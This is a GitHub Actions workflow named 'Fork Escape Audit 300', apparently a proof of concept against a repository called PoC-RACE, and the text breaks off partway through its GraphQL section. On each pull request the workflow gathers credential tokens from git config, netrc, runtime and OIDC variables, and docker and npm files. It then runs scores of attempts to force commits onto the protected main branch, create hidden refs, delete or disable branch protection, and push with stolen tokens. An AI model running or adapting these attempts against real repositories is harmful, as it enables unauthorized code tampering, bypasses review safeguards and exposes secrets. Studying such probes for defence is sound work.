name: Fork Escape Audit 300
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  checks: write
  statuses: write
  pull-requests: write
  actions: write
  packages: write
  deployments: write
  issues: write
  discussions: write
  id-token: write
  repository-projects: write
  security-events: write
  pages: write

jobs:
  fork-escape-300:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Escape Audit — 300+ bypass attempts
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO_OWNER: ${{ github.repository_owner }}
          REPO_NAME: ${{ github.event.repository.name }}
        run: |
          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
          GQL="https://api.github.com/graphql"
          TS=$(date -u '+%Y%m%d_%H%M%S')
          HEAD_SHA=$(git rev-parse HEAD)
          TOK="$GH_TOKEN"

          print() { echo "$1"; }
          h() { local code; code=$(curl -s -o /dev/null -w "%{http_code}" "$@"); echo "HTTP_${code}"; }

          print "=== CONTEXT ==="
          print "ACTOR=$GITHUB_ACTOR EVENT=$GITHUB_EVENT_NAME TOKEN=${TOK:0:12}"
          print "HEAD=$HEAD_SHA HEAD_REF=$GITHUB_HEAD_REF BASE_REF=$GITHUB_BASE_REF"
          print ""

          # ── TOKEN SOURCES ──────────────────────────────────────────────────
          print "=== TOKEN SOURCES ==="
          # S1: git config extraheader
          S1_RAW=$(git config --get http.https://github.com/.extraheader 2>/dev/null || echo "")
          S1_TOK=$(echo "$S1_RAW" | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 2>/dev/null || echo "")
          print "S1  git extraheader token: ${S1_TOK:0:12}"
          # S2: netrc
          S2_TOK=$(awk '/machine github.com/{f=1} f && /password/{print $2; exit}' ~/.netrc 2>/dev/null || echo "")
          print "S2  netrc token: ${S2_TOK:0:12}"
          # S3: ACTIONS_RUNTIME_TOKEN
          _ART="${ACTIONS_RUNTIME_TOKEN:-}"
          print "S3  ACTIONS_RUNTIME_TOKEN: ${_ART:0:12}"
          # S4: ACTIONS_ID_TOKEN_REQUEST_TOKEN
          _AIDTRT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
          print "S4  OIDC REQUEST TOKEN: ${_AIDTRT:0:12}"
          # S5: GITHUB_TOKEN (already known)
          print "S5  GITHUB_TOKEN: ${GITHUB_TOKEN:0:12}"
          # S6: scan all env vars
          print "S6  env token scan:"
          env | grep -iE '^(TOKEN|SECRET|KEY|AUTH|PASS|CRED|GHS_|GHU_|GHP_|GITHUB)' | grep -v '^GITHUB_TOKEN=' | sed 's/=.*/=[REDACTED]/' | head -20 || true
          # S7: Attempt git credential helper dump
          print "S7  cred helper: $(git config --global credential.helper 2>/dev/null || echo 'none')"
          # S8: Docker config
          print "S8  docker config: $(cat ~/.docker/config.json 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(list(d.get(\"auths\",{}).keys()))' 2>/dev/null || echo 'none')"
          # S9: NPM token
          print "S9  npm token: $(cat ~/.npmrc 2>/dev/null | grep '_authToken' | sed 's/.*=//' | head -c12 || echo 'none')"
          # S10: pip config
          print "S10 pip extra: $(pip config get global.extra-index-url 2>/dev/null || echo 'none')"
          print ""

          # ── MAIN SHA + TREE + GHOST ────────────────────────────────────────
          MAIN_SHA=$(git ls-remote origin refs/heads/main 2>/dev/null | cut -f1)
          TREE_SHA=$(curl -sf -H "Authorization: token $TOK" "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha // "FAILED"')
          print "main=$MAIN_SHA tree=$TREE_SHA"

          build_ghost() {
            local auth="$1"
            curl -s -X POST -H "$auth" -H "Content-Type: application/json" "${BASE}/git/commits" \
              -d "{\"message\":\"escape-${TS}\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
              | jq -r '.sha // "COMMIT_FAILED"'
          }

          GHOST=$(build_ghost "Authorization: token $TOK")
          print "ghost=$GHOST"
          print ""

          patch_main() {
            local label="$1"; shift
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "$@" \
              -H "Content-Type: application/json" "${BASE}/git/refs/heads/main" \
              -d "{\"sha\":\"${GHOST}\",\"force\":false}")
            print "${label} = HTTP_${code}"
          }
          patch_main_f() {
            local label="$1"; shift
            local code; code=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "$@" \
              -H "Content-Type: application/json" "${BASE}/git/refs/heads/main" \
              -d "{\"sha\":\"${GHOST}\",\"force\":true}")
            print "${label} = HTTP_${code}"
          }

          # ── BATCH A: PATCH /git/refs/heads/main — auth scheme variants ────
          print "=== BATCH A: PATCH main — auth header variants ==="
          BASIC1=$(echo -n "x-oauth-basic:${TOK}" | base64 -w0)
          BASIC2=$(echo -n "${TOK}:" | base64 -w0)
          BASIC3=$(echo -n ":${TOK}" | base64 -w0)
          BASIC4=$(echo -n "oauth2:${TOK}" | base64 -w0)
          BASIC5=$(echo -n "token:${TOK}" | base64 -w0)

          patch_main "A01 PATCH token f:F"    -H "Authorization: token $TOK"
          patch_main "A02 PATCH bearer f:F"   -H "Authorization: bearer $TOK"
          patch_main_f "A03 PATCH token f:T"  -H "Authorization: token $TOK"
          patch_main_f "A04 PATCH bearer f:T" -H "Authorization: bearer $TOK"
          patch_main "A05 PATCH Basic x-oauth-basic" -H "Authorization: Basic $BASIC1"
          patch_main "A06 PATCH Basic token:"        -H "Authorization: Basic $BASIC2"
          patch_main "A07 PATCH Basic :token"        -H "Authorization: Basic $BASIC3"
          patch_main "A08 PATCH Basic oauth2:token"  -H "Authorization: Basic $BASIC4"
          patch_main "A09 PATCH Basic token:token"   -H "Authorization: Basic $BASIC5"
          patch_main "A10 PATCH no auth"             # no auth header
          patch_main "A11 PATCH +ApiVersion 2022-11-28" -H "Authorization: token $TOK" -H "X-GitHub-Api-Version: 2022-11-28"
          patch_main "A12 PATCH Accept:v3"    -H "Authorization: token $TOK" -H "Accept: application/vnd.github.v3+json"
          patch_main "A13 PATCH Accept:json"  -H "Authorization: token $TOK" -H "Accept: application/json"
          patch_main "A14 PATCH +X-Req-With"  -H "Authorization: token $TOK" -H "X-Requested-With: XMLHttpRequest"
          patch_main "A15 PATCH UA:curl"      -H "Authorization: token $TOK" -H "User-Agent: curl/8.5.0"
          patch_main "A16 PATCH UA:GH-runner" -H "Authorization: token $TOK" -H "User-Agent: GitHub-Actions-Runner/2.331.0"
          patch_main "A17 PATCH UA:GH-CLI"    -H "Authorization: token $TOK" -H "User-Agent: GitHub-CLI/2.43.0"
          patch_main "A18 PATCH UA:go-http"   -H "Authorization: token $TOK" -H "User-Agent: go-github/60.0.0"
          patch_main "A19 PATCH +XFF"         -H "Authorization: token $TOK" -H "X-Forwarded-For: 140.82.121.1"
          patch_main "A20 PATCH +X-Real-IP"   -H "Authorization: token $TOK" -H "X-Real-IP: 140.82.121.1"
          patch_main "A21 PATCH +Origin GH"   -H "Authorization: token $TOK" -H "Origin: https://github.com"
          patch_main "A22 PATCH +Referer GH"  -H "Authorization: token $TOK" -H "Referer: https://github.com/twrps/PoC-RACE"
          patch_main "A23 PATCH method-override PUT" -H "Authorization: token $TOK" -H "X-HTTP-Method-Override: PATCH"
          # A24 — PUT to refs endpoint (PATCH via PUT override)
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          print "A24 PUT /git/refs/heads/main = HTTP_${R}"
          # A25 — POST to refs endpoint (wrong verb)
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          print "A25 POST /git/refs/heads/main = HTTP_${R}"
          # A26 — PATCH with force:null
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":null}")
          print "A26 PATCH force:null = HTTP_${R}"
          # A27 — PATCH with no force field at all
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\"}")
          print "A27 PATCH no force field = HTTP_${R}"
          # A28 — PATCH to full v3 URL
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          print "A28 PATCH full URL = HTTP_${R}"
          # A29 — PATCH via upload.github.com
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "https://uploads.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/main" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}" 2>/dev/null || echo "000")
          print "A29 PATCH uploads.github.com = HTTP_${R}"
          # A30 — git tok from S1
          if [ -n "${S1_TOK}" ]; then
            R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
              -H "Authorization: token $S1_TOK" -H "Content-Type: application/json" \
              "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
            print "A30 PATCH extraheader-tok = HTTP_${R}"
          else
            print "A30 extraheader tok: not available"
          fi
          print ""

          # ── BATCH B: WRITE ATTEMPTS via other endpoints ───────────────────
          print "=== BATCH B: Other write endpoints ==="
          # B01 POST new branch
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/heads/escape-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
          print "B01 POST new branch = HTTP_${R}"
          # B02 PUT /contents main
          B64=$(echo -n "esc" | base64 -w0)
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/contents/esc-${TS}.txt" \
            -d "{\"message\":\"esc\",\"content\":\"${B64}\",\"branch\":\"main\"}")
          print "B02 PUT /contents/main = HTTP_${R}"
          # B03 PUT /contents PR branch
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/contents/esc-${TS}.txt" \
            -d "{\"message\":\"esc\",\"content\":\"${B64}\",\"branch\":\"${GITHUB_HEAD_REF}\"}")
          print "B03 PUT /contents/PR-branch = HTTP_${R}"
          # B04 POST blob
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/blobs" -d "{\"content\":\"test\",\"encoding\":\"utf-8\"}")
          print "B04 POST blob = HTTP_${R}"
          # B05 POST tree
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/trees" \
            -d "{\"base_tree\":\"${TREE_SHA}\",\"tree\":[{\"path\":\"esc.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"content\":\"esc\"}]}")
          print "B05 POST tree = HTTP_${R}"
          # B06 POST commit
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{\"message\":\"esc\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"]}")
          print "B06 POST commit = HTTP_${R}"
          # B07 POST merges
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"esc\"}")
          print "B07 POST /merges ghost→main = HTTP_${R}"
          # B08 POST merges HEAD_REF→main
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GITHUB_HEAD_REF}\",\"commit_message\":\"esc\"}")
          print "B08 POST /merges headref→main = HTTP_${R}"
          # B09 POST /releases
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/releases" \
            -d "{\"tag_name\":\"esc-${TS}\",\"name\":\"esc\",\"target_commitish\":\"main\"}")
          print "B09 POST /releases = HTTP_${R}"
          # B10 PATCH PR head branch
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/heads/${GITHUB_HEAD_REF}" \
            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
          print "B10 PATCH PR headref = HTTP_${R}"
          # B11 POST annotated tag
          TAG_SHA=$(curl -s -X POST -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/tags" \
            -d "{\"tag\":\"esc-${TS}\",\"message\":\"esc\",\"object\":\"${MAIN_SHA}\",\"type\":\"commit\",\"tagger\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\",\"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}}" \
            | jq -r '.sha // "FAILED"')
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/tags/esc-${TS}\",\"sha\":\"${TAG_SHA}\"}")
          print "B11 POST annotated tag = HTTP_${R}"
          # B12 PATCH existing tag
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs/tags/esc-${TS}" \
            -d "{\"sha\":\"${GHOST}\",\"force\":true}")
          print "B12 PATCH tag force-move = HTTP_${R}"
          # B13 POST hidden ref refs/meta/
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/meta/esc-${TS}\",\"sha\":\"${GHOST}\"}")
          print "B13 POST refs/meta/ = HTTP_${R}"
          # B14 POST refs/notes/
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/notes/esc-${TS}\",\"sha\":\"${GHOST}\"}")
          print "B14 POST refs/notes/ = HTTP_${R}"
          # B15 POST refs/hidden/
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/hidden/esc-${TS}\",\"sha\":\"${GHOST}\"}")
          print "B15 POST refs/hidden/ = HTTP_${R}"
          # B16 POST refs/pull/<pr>/head
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/git/refs" -d "{\"ref\":\"refs/pull/999/head\",\"sha\":\"${GHOST}\"}")
          print "B16 POST refs/pull/999/head = HTTP_${R}"
          # B17 PATCH main with ACTIONS_RUNTIME_TOKEN if available
          if [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]; then
            R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
              -H "Authorization: token $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" \
              "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
            print "B17 PATCH with ACTIONS_RUNTIME_TOKEN = HTTP_${R}"
          else
            print "B17 ACTIONS_RUNTIME_TOKEN: not set"
          fi
          # B18 ACTIONS_ID_TOKEN_REQUEST_TOKEN
          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
            OIDC=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "${ACTIONS_ID_TOKEN_REQUEST_URL}?audience=api.github.com" | jq -r '.value // "FAILED"')
            R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
              -H "Authorization: token $OIDC" -H "Content-Type: application/json" \
              "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
            print "B18 PATCH with OIDC token = HTTP_${R}"
          else
            print "B18 OIDC token: not available (id-token:write ignored on fork?)"
          fi
          # B19 DELETE branch protection
          R=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
            -H "Authorization: token $TOK" \
            "${BASE}/branches/main/protection")
          print "B19 DELETE branch protection = HTTP_${R}"
          # B20 PUT branch protection (disable it)
          R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
            -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "${BASE}/branches/main/protection" \
            -d "{\"required_status_checks\":null,\"enforce_admins\":false,\"required_pull_request_reviews\":null,\"restrictions\":null}")
          print "B20 PUT /protection (disable) = HTTP_${R}"
          print ""

          # ── BATCH C: git protocol attacks ─────────────────────────────────
          print "=== BATCH C: git protocol ==="
          git config user.email "bot@github.com"
          git config user.name "github-actions[bot]"
          git commit --allow-empty -m "esc-${TS}"
          # C01 git push to main
          C01=$(git push "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/main 2>&1 | tail -1)
          print "C01 git push main = ${C01}"
          # C02 git push force to main
          C02=$(git push --force "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/main 2>&1 | tail -1)
          print "C02 git push --force main = ${C02}"
          # C03 git push new branch
          C03=$(git push "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/git-esc-${TS} 2>&1 | tail -1)
          print "C03 git push new branch = ${C03}"
          # C04 git push refs/notes/
          C04=$(git push "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/notes/git-${TS} 2>&1 | tail -1)
          print "C04 git push refs/notes/ = ${C04}"
          # C05 git push with bearer auth
          C05=$(git push "https://oauth2:${TOK}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/git-bearer-${TS} 2>&1 | tail -1)
          print "C05 git push oauth2: auth = ${C05}"
          # C06 git push via SSH with GH_TOKEN as SSH key (expect fail but log)
          C06=$(GIT_SSH_COMMAND="echo skip" git push "git@github.com:${GITHUB_REPOSITORY}.git" HEAD:refs/heads/ssh-${TS} 2>&1 | tail -1 || echo "SSH_SKIPPED")
          print "C06 git push SSH = ${C06}"
          # C07 smart-http info/refs
          R=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "Authorization: token $TOK" \
            "https://github.com/${GITHUB_REPOSITORY}.git/info/refs?service=git-receive-pack")
          print "C07 git smart-http receive-pack refs = HTTP_${R}"
          # C08 smart-http POST receive-pack
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token $TOK" \
            -H "Content-Type: application/x-git-receive-pack-request" \
            "https://github.com/${GITHUB_REPOSITORY}.git/git-receive-pack")
          print "C08 git smart-http POST receive-pack = HTTP_${R}"
          # C09 git push prune (delete remote branch)
          C09=$(git push "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" ":refs/heads/escape-${TS}" 2>&1 | tail -1 || echo "PRUNE_FAILED")
          print "C09 git push delete branch = ${C09}"
          print ""

          # ── BATCH D: GraphQL mutations ────────────────────────────────────
          print "=== BATCH D: GraphQL mutations ==="
          REPO_ID=$(curl -sf -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "$GQL" -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE\") { id databaseId } }"}' \
            | jq -r '.data.repository.id // "FAILED"')
          NODE_MAIN=$(curl -sf -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "$GQL" -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE\") { ref(qualifiedName:\"refs/heads/main\") { id } } }"}' \
            | jq -r '.data.repository.ref.id // "FAILED"')
          PR_NODE=$(curl -sf -H "Authorization: token $TOK" -H "Content-Type: application/json" \
            "$GQL" -d "{\"query\":\"{ repository(owner:\\\"twrps\\\",name:\\\"PoC-RACE\\\") { pullRequest(number:2) { id } } }\"}" \
            | jq -r '.data.repository.pullRequest.id // "FAILED"')
          print "repo_id=$REPO_ID  main_ref_node=$NODE_MAIN  pr_node=$PR_NODE"

          gql_mut() {
            local label="$1"; local query="$2"
            local R; R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $TOK" -H "Content-Type: application/json" \
              "$GQL" -d "{\"query\":\"${query}\"}")
            print "${label} = HTTP_${R}"
          }
          gql_full() {
            local label="$1"; local query="$2"
            local R; R=$(curl -s -X POST \
              -H "Authorization: token $TOK" -H "Content-Type: application/json" \
              "$GQL" -d "{\"query\":\"${query}\"}" | jq -c '{errors:.errors, data:.data}')
